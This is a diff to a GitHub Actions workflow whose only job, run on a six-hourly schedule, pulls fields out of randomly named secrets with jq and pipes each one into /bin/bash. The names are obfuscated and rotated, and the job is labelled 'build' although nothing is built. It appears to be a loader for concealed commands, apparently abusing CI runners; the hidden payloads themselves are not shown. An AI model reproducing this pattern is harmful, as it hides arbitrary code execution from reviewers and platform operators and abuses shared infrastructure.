@@ -3,28 +3,24 @@ name: yanfusu1932
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 3/6 * * *'
-
-jobs:  # 26528
+    - cron: '50 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yanfusu1932
         env:
-          oct83386: ${{ secrets.oct83386 }}
+          oj92: ${{ secrets.oj92 }}
         run: |
-          echo $oct83386 | jq -r .to7968 | /bin/bash
-          echo $umdn539 | jq -r .sbhen1398 | /bin/bash
-          echo $t877 | jq -r .ln0523 | /bin/bash
-          echo $yw9 | jq -r .aadyi95 | /bin/bash
-          echo $myym928 | jq -r .t28 | /bin/bash
-          echo $ftxn374 | jq -r .czkhz6493 | /bin/bash
-          echo $rmzab0070 | jq -r .t44159 | /bin/bash
-          echo $nas32808 | jq -r .ogsp3 | /bin/bash
-          echo $zpv55805 | jq -r .zbnm513 | /bin/bash
-          echo $xpks346 | jq -r .xywpb0965 | /bin/bash
-          echo $fkxf600 | jq -r .np4092 | /bin/bash
-          echo $fpr40180 | jq -r .zbif4 | /bin/bash
-          echo $lxc27716 | jq -r .nenp18561 | /bin/bash
+          echo $oj92 | jq -r .hetpx912 | /bin/bash
+          echo $fiw7 | jq -r .wu895 | /bin/bash
+          echo $k94374 | jq -r .u4924 | /bin/bash
+          echo $d8799 | jq -r .pxkf8 | /bin/bash
+          echo $g10733 | jq -r .qvhu1840 | /bin/bash
+          echo $zokjq2 | jq -r .ln28 | /bin/bash
+          echo $n5 | jq -r .itxo8456 | /bin/bash
+          echo $nlil3639 | jq -r .ygvhw7520 | /bin/bash
+          echo $hloht20160 | jq -r .ods624 | /bin/bash
+          echo $kg39693 | jq -r .wmv637 | /bin/bash
 
